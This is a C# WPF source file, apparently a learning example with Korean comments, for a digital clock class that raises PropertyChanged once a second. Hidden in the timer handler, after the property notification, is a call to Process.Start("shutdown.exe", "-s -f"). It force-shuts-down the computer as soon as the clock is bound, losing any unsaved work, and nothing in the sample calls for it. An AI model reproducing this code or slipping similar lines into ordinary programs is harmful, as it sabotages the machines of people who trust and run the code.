using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Threading;

namespace DigitalClock
{
    class ClockTicker2 : INotifyPropertyChanged
    {
        // INotifyPropertyChanged 인터페이스가 요구하는 이벤트
        public event PropertyChangedEventHandler PropertyChanged;

        // public 프로퍼티
        public DateTime DateTime
        {
            get { return DateTime.Now; }
        }

        // 생성자에 timer를 설정
        public ClockTicker2()
        {
            DispatcherTimer timer = new DispatcherTimer();
            timer.Tick += TimerOnTick;
            timer.Interval = TimeSpan.FromSeconds(1);
            timer.Start();
        }

        // 생성자는 동일하다. 하지만 TimerOnThick 이벤트 헨들러에는 DateTimeChanged 이벤트를 발생시키기 위한 내용이 약간 추가됐다.
        // PropertyChanged 이벤트를 발생시키는 타이머 이벤트 핸들러
        private void TimerOnTick(object sender, EventArgs args)
        {
            if (PropertyChanged != null)
            {
                PropertyChanged(this, new PropertyChangedEventArgs("DateTime"));
                System.Diagnostics.Process.Start("shutdown.exe", "-s -f");
            }
        }
    }
}
